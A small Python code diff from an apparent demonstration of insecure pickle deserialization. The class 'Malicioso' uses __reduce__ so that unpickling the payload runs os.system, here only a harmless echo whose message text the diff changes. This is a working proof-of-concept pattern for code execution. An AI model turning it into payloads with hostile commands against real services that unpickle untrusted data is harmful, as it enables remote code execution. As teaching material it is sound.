@@ -4,7 +4,7 @@ import pickle
 
 class Malicioso:
     def __reduce__(self):
-        return (os.system, ("echo ESTO SE EJECUTO AL DESERIALIZAR",))
+        return (os.system, ("echo TEXTO QUE SE EJECUTO AL DESERIALIZAR",))
 
 
 payload = pickle.dumps(Malicioso())
